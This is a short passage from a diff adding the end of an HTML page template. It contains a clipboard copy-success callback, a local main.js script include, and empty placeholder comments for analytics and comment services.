+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
